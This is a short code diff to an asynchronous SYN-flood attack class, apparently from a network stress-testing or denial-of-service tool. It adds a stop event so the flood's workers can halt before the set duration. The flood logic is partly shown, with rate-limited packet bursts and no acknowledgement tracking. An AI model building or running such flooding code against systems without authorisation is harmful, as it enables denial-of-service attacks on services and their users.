@@ -51,14 +51,17 @@ class SynFlood(AttackEngine):
         worker_count = min(self.workers, self.target_rps)
 
         async def worker() -> None:
-            while True:
+            while not self.stop_event.is_set():
                 await self.bucket.acquire(per_worker)
                 await loop.run_in_executor(None, burst, per_worker)
                 self.stats["sent"] += per_worker
                 self.stats["ok"] += per_worker  # fire-and-forget; no ACK tracking in MVP
 
         workers = [asyncio.create_task(worker()) for _ in range(worker_count)]
-        await asyncio.sleep(self.duration_sec)
+        try:
+            await asyncio.wait_for(self.stop_event.wait(), timeout=self.duration_sec)
+        except asyncio.TimeoutError:
+            pass
         for w in workers:
             w.cancel()
         await asyncio.gather(*workers, return_exceptions=True)
